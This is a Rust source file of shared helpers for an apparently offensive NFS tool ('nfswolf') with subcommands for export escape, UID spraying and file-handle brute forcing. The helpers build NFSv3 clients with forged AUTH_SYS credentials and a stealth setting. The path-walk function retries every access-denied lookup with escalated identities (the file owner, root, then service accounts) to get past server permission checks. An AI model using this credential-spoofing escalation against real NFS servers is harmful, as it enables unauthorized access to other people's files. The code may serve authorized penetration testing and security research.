//! Shared connection / lookup helpers used by the offensive subcommands
//! (`escape`, `uid-spray`, `brute-handle`).
//!
//! These are pulled out of the individual subcommand files because all
//! three need the same primitives: parse a `<TARGET>` into a `SocketAddr`,
//! build a pool-backed `Nfs3Client` with a chosen credential, and walk a
//! path with credential escalation on `NFS3ERR_ACCES`.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Context as _;

use crate::engine::credential::escalation_list;
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::util::stealth::StealthConfig;

/// Parse a host string into a `SocketAddr` using NFS port 2049.
///
/// Accepts the same `<TARGET>` shapes as the rest of the CLI:
/// `host`, `host:port`, `host:/export` (export portion ignored here).
pub fn parse_addr(host: &str) -> anyhow::Result<SocketAddr> {
    // Strip an optional `:/export` suffix so the colon-form target works
    // wherever a bare host did before.
    let host = host.find(":/").map_or(host, |idx| &host[..idx]);
    // Try direct parse first (handles host:port format).
    if let Ok(addr) = host.parse::<SocketAddr>() {
        return Ok(addr);
    }
    // Append default NFS port.
    format!("{host}:2049").parse::<SocketAddr>().with_context(|| format!("invalid host: {host}"))
}

/// Build an `Nfs3Client` for the given host, export, and AUTH_SYS credential.
pub fn make_client(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    let pool = Arc::new(ConnectionPool::default_config());
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, aux_gids);
    let auth = AuthSys::with_groups(uid, gid, &gids, "nfswolf");
    let cred = Credential::Sys(auth);
    let key = PoolKey { host: addr, export: export.to_owned(), uid, gid };
    let client = Nfs3Client::new(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent);
    (pool, circuit, client)
}

/// Build the GID list for AUTH_SYS: primary GID first, then aux GIDs (deduped).
fn build_gid_list(gid: u32, aux_gids: &[u32]) -> Vec<u32> {
    let mut gids = vec![gid];
    for &g in aux_gids {
        if !gids.contains(&g) {
            gids.push(g);
        }
    }
    gids
}

/// Walk a path component-by-component from a root handle, retrying with
/// escalated credentials on `NFS3ERR_ACCES`.
///
/// The escalation ladder mirrors the one the shell and FUSE adapter use
/// (see `engine::credential::escalation_list`): owner first, then root,
/// then well-known service accounts. File handles are bearer tokens
/// (RFC 1094 S2.3.3), so every successful escalation produces a handle
/// the caller can use with any later credential.
pub async fn lookup_path(client: &Nfs3Client, root: &FileHandle, path: &str) -> anyhow::Result<FileHandle> {
    use nfs3_types::nfs3::{LOOKUP3args, Nfs3Result, diropargs3, filename3, nfsstat3};

    let components: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    let mut current = root.clone();

    for component in components {
        let args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
        let res = client.lookup(&args).await?;
        match res {
            Nfs3Result::Ok(ok) => {
                current = FileHandle::from_nfs_fh3(&ok.object);
            },
            Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES, _)) => {
                let owner_uid = get_owner_uid(client, &current).await;
                let try_uids = escalation_list((client.uid(), client.gid()), owner_uid);

                let mut resolved = false;
                for (uid, gid) in &try_uids {
                    let esc_client = client.with_credential(Credential::Sys(AuthSys::with_groups(*uid, *gid, &[*gid], "nfswolf")), *uid, *gid);
                    let esc_args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
                    if let Ok(Nfs3Result::Ok(ok)) = esc_client.lookup(&esc_args).await {
                        tracing::debug!(component, uid, gid, "LOOKUP succeeded with escalated credential");
                        current = FileHandle::from_nfs_fh3(&ok.object);
                        resolved = true;
                        break;
                    }
                }
                if !resolved {
                    anyhow::bail!("LOOKUP {component}: NFS3ERR_ACCES (tried {} credentials)", try_uids.len());
                }
            },
            Nfs3Result::Err((stat, _)) => {
                anyhow::bail!("LOOKUP {component}: {stat:?}");
            },
        }
    }

    Ok(current)
}

/// Get the owner (uid, gid) of a file/directory handle via GETATTR.
/// Returns `None` on any error (best-effort).
async fn get_owner_uid(client: &Nfs3Client, fh: &FileHandle) -> Option<(u32, u32)> {
    use nfs3_types::nfs3::{GETATTR3args, Nfs3Result};
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) => Some((ok.obj_attributes.uid, ok.obj_attributes.gid)),
        _ => None,
    }
}
